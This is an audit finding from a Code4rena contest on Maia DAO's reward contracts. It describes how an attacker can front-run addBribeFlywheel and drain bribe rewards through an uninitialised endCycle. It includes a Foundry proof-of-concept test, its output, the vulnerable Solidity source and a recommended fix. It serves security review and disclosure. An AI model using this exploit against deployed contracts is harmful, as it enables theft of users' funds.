{
  "Title": "[H-29] A malicious user can front-run Gauges's call `addBribeFlywheel` to steal bribe rewards",
  "Content": "\n### Lines of code\n<https://github.com/code-423n4/2023-05-maia/blob/main/src/rewards/rewards/FlywheelAcummulatedRewards.sol#L46-L54>\n\n### Impact\n\nWhen the Gauge in the initial setup and flywheel is created and added to the gauge via `addBribeFlywheel`, a malicious user can front-run this to steal rewards. This could happen due to the un-initialized `endCycle` inside the `FlywheelAcummulatedRewards` contract.\n\n### Proof of Concept\n\nConsider this scenario :\n\n1. Gauge is first created, then an admin deposit of 100 eth is sent to depot reward.\n2. FlyWheel is also created, using `FlywheelBribeRewards` inherent in the `FlywheelAcummulatedRewards\\` implementation.\n3. A malicious attacker has `addBribeFlywheel` that is about to be called by the owner and front-run it by calling `incrementGauge` (a huge amount of gauge token for this gauge).\n4. The call `addBribeFlywheel` is executed.\n5. Now, a malicious user can trigger `accrueBribes` and claim the reward.\n6. The bribe rewards are now stolen and a malicious user can immediately decrement their gauge from this contract.\n\nAll of this is possible, because `endCycle` is not initialized inside `FlywheelAcummulatedRewards` when first created:\n\n<https://github.com/code-423n4/2023-05-maia/blob/main/src/rewards/rewards/FlywheelAcummulatedRewards.sol#L26-L35>\n\n```solidity\nabstract contract FlywheelAcummulatedRewards is BaseFlywheelRewards, IFlywheelAcummulatedRewards {\n    using SafeCastLib for uint256;\n\n    /*//////////////////////////////////////////////////////////////\n                        REWARDS CONTRACT STATE\n    //////////////////////////////////////////////////////////////*/\n\n    /// @inheritdoc IFlywheelAcummulatedRewards\n    uint256 public immutable override rewardsCycleLength;\n\n    /// @inheritdoc IFlywheelAcummulatedRewards\n    uint256 public override endCycle; // NOTE INITIALIZED INSIDE CONSTRUCTOR\n\n    /**\n     * @notice Flywheel Instant Rewards constructor.\n     *  @param _flywheel flywheel core contract\n     *  @param _rewardsCycleLength the length of a rewards cycle in seconds\n     */\n    constructor(FlywheelCore _flywheel, uint256 _rewardsCycleLength) BaseFlywheelRewards(_flywheel) {\n        rewardsCycleLength = _rewardsCycleLength;\n    }\n    ...\n\n}\n```\n\nSo right after it is created and attached to the gauge, the distribution of rewards can be called immediately via `accrueBribes` inside the gauge. If no previous user put their gauge tokens into this gauge contract, rewards can easily drained.\n\nFoundry PoC (add this test inside `BaseV2GaugeTest.t.sol`):\n\n```solidity\n    function testAccrueAndClaimBribesAbuse() external {\n        address alice = address(0xABCD);\n        MockERC20 token = new MockERC20(\"test token\", \"TKN\", 18);\n        FlywheelCore flywheel = createFlywheel(token);\n        FlywheelBribeRewards bribeRewards = FlywheelBribeRewards(\n            address(flywheel.flywheelRewards())\n        );\n        gaugeToken.setMaxDelegates(1);\n        token.mint(address(depot), 100 ether);\n\n        // ALICE SEE THAT THIS IS NEW GAUGE, about to add new NEW FLYWHEEL REWARDS\n\n        // alice put a lot of his hermes or could also get from flash loan\n        hermes.mint(alice, 100e18);\n        hevm.startPrank(alice);\n        hermes.approve(address(gaugeToken), 100e18);\n        gaugeToken.mint(alice, 100e18);\n        gaugeToken.delegate(alice);\n        gaugeToken.incrementGauge(address(gauge), 100e18);\n        console.log(\"hermes total supply\");\n        console.log(hermes.totalSupply());\n        hevm.stopPrank();\n        // NEW BRIBE FLYWHEEL IS ADDED\n        hevm.expectEmit(true, true, true, true);\n        emit AddedBribeFlywheel(flywheel);\n        gauge.addBribeFlywheel(flywheel);\n        // ALICE ACCRUE BRIBES\n        gauge.accrueBribes(alice);\n        console.log(\"bribe rewards balance before claim : \");\n        console.log(token.balanceOf(address(bribeRewards)));\n\n        flywheel.claimRewards(alice);\n        console.log(\"bribe rewards balance after claim : \");\n        console.log(token.balanceOf(address(bribeRewards)));\n\n        console.log(\"alice rewards balance : \");\n        console.log(token.balanceOf(alice));\n        // after steal reward, alice could just disengage from the gauge, and look for another new gauge with new flywheel\n        hevm.startPrank(alice);\n        gaugeToken.decrementGauge(address(gauge), 100e18);\n        hevm.stopPrank();\n    }\n```\n\nPoC log output:\n\n      bribe rewards balance before claim : \n      100000000000000000000\n      bribe rewards balance after claim : \n      0\n      alice rewards balance : \n      100000000000000000000\n\n### Recommended Mitigation Steps\n\nAdd initialized `endCycle` inside `FlywheelAcummulatedRewards`:\n\n```solidity\n    constructor(\n        FlywheelCore _flywheel,\n        uint256 _rewardsCycleLength\n    ) BaseFlywheelRewards(_flywheel) {\n        rewardsCycleLength = _rewardsCycleLength;\n        endCycle = ((block.timestamp.toUint32() + rewardsCycleLength) /\n                rewardsCycleLength) * rewardsCycleLength;        \n    }\n```\n\n**[Trust (judge) decreased severity to Medium](https://github.com/code-423n4/2023-05-maia-findings/issues/206#issuecomment-1631200310)**\n\n**[0xLightt (Maia) confirmed and commented](https://github.com/code-423n4/2023-05-maia-findings/issues/206#issuecomment-1633255816):**\n > The mitigation should take into account the following issue [#457](https://github.com/code-423n4/2023-05-maia-findings/issues/457). So the best solution would be to check if `endCycle` is zero. If it is, then zero rewards are accrued and `endCycle` is set to end of the epoch.\n\n**[Trust (judge) increased severity to High and commented](https://github.com/code-423n4/2023-05-maia-findings/issues/206#issuecomment-1649400073):**\n > Upon second viewing, it seems the attack is in line with High severity.\n\n\n**[0xLightt (Maia) commented](https://github.com/code-423n4/2023-05-maia-findings/issues/206#issuecomment-1709936080):**\n > Addressed [here](https://github.com/Maia-DAO/eco-c4-contest/tree/206-457).\n\n***\n\n",
  "Impact": "HIGH",
  "Source": "https://code4rena.com/reports/2023-05-maia",
  "Code": [
    {
      "filename": "src/rewards/rewards/FlywheelAcummulatedRewards.sol",
      "content": "// SPDX-License-Identifier: MIT\n// Rewards logic inspired by Tribe DAO Contracts (flywheel-v2/src/rewards/FlywheelDynamicRewards.sol)\npragma solidity ^0.8.0;\n\nimport {SafeCastLib} from \"solady/utils/SafeCastLib.sol\";\nimport {SafeTransferLib} from \"solady/utils/SafeTransferLib.sol\";\n\nimport {ERC20} from \"solmate/tokens/ERC20.sol\";\n\nimport {BaseFlywheelRewards, FlywheelCore} from \"../base/BaseFlywheelRewards.sol\";\n\nimport {IFlywheelAcummulatedRewards} from \"../interfaces/IFlywheelAcummulatedRewards.sol\";\n\n///  @title Flywheel Accumulated Rewards.\nabstract contract FlywheelAcummulatedRewards is BaseFlywheelRewards, IFlywheelAcummulatedRewards {\n    using SafeCastLib for uint256;\n\n    /*//////////////////////////////////////////////////////////////\n                        REWARDS CONTRACT STATE\n    //////////////////////////////////////////////////////////////*/\n\n    /// @inheritdoc IFlywheelAcummulatedRewards\n    uint256 public immutable override rewardsCycleLength;\n\n    /// @inheritdoc IFlywheelAcummulatedRewards\n    uint256 public override endCycle;\n\n    /**\n     * @notice Flywheel Instant Rewards constructor.\n     *  @param _flywheel flywheel core contract\n     *  @param _rewardsCycleLength the length of a rewards cycle in seconds\n     */\n    constructor(FlywheelCore _flywheel, uint256 _rewardsCycleLength) BaseFlywheelRewards(_flywheel) {\n        rewardsCycleLength = _rewardsCycleLength;\n    }\n\n    /*//////////////////////////////////////////////////////////////\n                        FLYWHEEL CORE FUNCTIONS\n    //////////////////////////////////////////////////////////////*/\n\n    /// @inheritdoc IFlywheelAcummulatedRewards\n    function getAccruedRewards(ERC20 strategy) external override onlyFlywheel returns (uint256 amount) {\n        uint32 timestamp = block.timestamp.toUint32();\n\n        // if cycle has ended, reset cycle and transfer all available\n        if (timestamp >= endCycle) {\n            amount = getNextCycleRewards(strategy);\n\n            // reset for next cycle\n            uint256 newEndCycle = ((timestamp + rewardsCycleLength) / rewardsCycleLength) * rewardsCycleLength;\n            endCycle = newEndCycle;\n\n            emit NewRewardsCycle(timestamp, newEndCycle, amount);\n        } else {\n            amount = 0;\n        }\n    }\n\n    /// @notice function to get the next cycle's rewards amount\n    function getNextCycleRewards(ERC20 strategy) internal virtual returns (uint256);\n}"
    },
    {
      "filename": "src/rewards/rewards/FlywheelAcummulatedRewards.sol",
      "content": "// SPDX-License-Identifier: MIT\n// Rewards logic inspired by Tribe DAO Contracts (flywheel-v2/src/rewards/FlywheelDynamicRewards.sol)\npragma solidity ^0.8.0;\n\nimport {SafeCastLib} from \"solady/utils/SafeCastLib.sol\";\nimport {SafeTransferLib} from \"solady/utils/SafeTransferLib.sol\";\n\nimport {ERC20} from \"solmate/tokens/ERC20.sol\";\n\nimport {BaseFlywheelRewards, FlywheelCore} from \"../base/BaseFlywheelRewards.sol\";\n\nimport {IFlywheelAcummulatedRewards} from \"../interfaces/IFlywheelAcummulatedRewards.sol\";\n\n///  @title Flywheel Accumulated Rewards.\nabstract contract FlywheelAcummulatedRewards is BaseFlywheelRewards, IFlywheelAcummulatedRewards {\n    using SafeCastLib for uint256;\n\n    /*//////////////////////////////////////////////////////////////\n                        REWARDS CONTRACT STATE\n    //////////////////////////////////////////////////////////////*/\n\n    /// @inheritdoc IFlywheelAcummulatedRewards\n    uint256 public immutable override rewardsCycleLength;\n\n    /// @inheritdoc IFlywheelAcummulatedRewards\n    uint256 public override endCycle;\n\n    /**\n     * @notice Flywheel Instant Rewards constructor.\n     *  @param _flywheel flywheel core contract\n     *  @param _rewardsCycleLength the length of a rewards cycle in seconds\n     */\n    constructor(FlywheelCore _flywheel, uint256 _rewardsCycleLength) BaseFlywheelRewards(_flywheel) {\n        rewardsCycleLength = _rewardsCycleLength;\n    }\n\n    /*//////////////////////////////////////////////////////////////\n                        FLYWHEEL CORE FUNCTIONS\n    //////////////////////////////////////////////////////////////*/\n\n    /// @inheritdoc IFlywheelAcummulatedRewards\n    function getAccruedRewards(ERC20 strategy) external override onlyFlywheel returns (uint256 amount) {\n        uint32 timestamp = block.timestamp.toUint32();\n\n        // if cycle has ended, reset cycle and transfer all available\n        if (timestamp >= endCycle) {\n            amount = getNextCycleRewards(strategy);\n\n            // reset for next cycle\n            uint256 newEndCycle = ((timestamp + rewardsCycleLength) / rewardsCycleLength) * rewardsCycleLength;\n            endCycle = newEndCycle;\n\n            emit NewRewardsCycle(timestamp, newEndCycle, amount);\n        } else {\n            amount = 0;\n        }\n    }\n\n    /// @notice function to get the next cycle's rewards amount\n    function getNextCycleRewards(ERC20 strategy) internal virtual returns (uint256);\n}"
    }
  ]
}